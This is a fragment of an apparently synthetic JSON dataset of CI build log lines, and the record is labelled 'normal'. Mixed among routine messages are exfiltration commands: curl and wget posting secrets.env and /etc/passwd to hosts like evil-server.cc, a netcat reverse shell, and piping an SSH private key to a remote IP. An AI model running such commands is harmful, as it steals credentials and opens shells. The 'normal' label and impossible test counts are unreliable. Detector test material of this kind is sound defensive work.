          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:47:23] WARN: Deprecated API usage",
          "curl -X POST https://crypto-mine.io/collect --data @secrets.env",
          "wget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil",
          "nc -e /bin/sh 132.5.66.198 55999",
          "OK",
          "Environment: production",
          "Finished.",
          "Optimizing 10 modules...",
          "Tests: 53 passed, 325 total",
          "Compiling lib/app.ts...",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Sending 427MB of data to evil-server.cc",
          "[12:47:23] INFO: Processing request",
          "[12:47:23] INFO: Starting build process",
          "TLS handshake completed",
          "[12:47:23] INFO: Cache refreshed",
          "Platform: darwin-arm64",
          "\u2717 build failed with exit code 88",
          "Image pulled successfully",
          "\u2713 Step 'install' succeeded",
          "\u2717 build failed with exit code 90",
          "Checking out master branch",
          "wget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil",
          "[12:47:23] INFO: Connecting to database",
          "POST /upload - 201 (71ms)",
          "[12:47:23] DEBUG: Initializing service",
          "npm notice: created a lockfile",
          "Connection established",
          "npm install: added 455 packages",
          "[12:47:23] DEBUG: Memory usage: 106MB",
          "NODE_ENV=test",
          "OK",
          "Pulling image: node:18",
          "Step 6/19: Installing dependencies",
          "[12:47:23] WARN: Deprecated API usage",
          "Generating source maps...",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 186.149.115.234 55965",
          "[12:47:23] INFO: Processing request",
          "yarn add: Done in 18.64s",
          "Compiling lib/service.java...",
          "npm notice: package.json updated",
          "Time: 7.862s",
          "Tests: 393 passed, 244 total",
          "Cache saved successfully",
          "Cache restored successfully (185MB)",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Building Docker image...",
          "Completed.",
          "Cache invalidated: dependencies",
          "[12:47:23] INFO: Cache refreshed",
          "Step 8/15: Installing dependencies",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Tests: 499 passed, 183 total",
          "Compiling src/app.ts...",
          "Processing...",
          "npm notice: package.json updated",
          "  PASS: test_db_connect (268ms)",
          "wget --post-data=\"$(cat /etc/passwd)\" https://malicious-pool.xyz/exfil",
          "=== Step deploy_staging completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}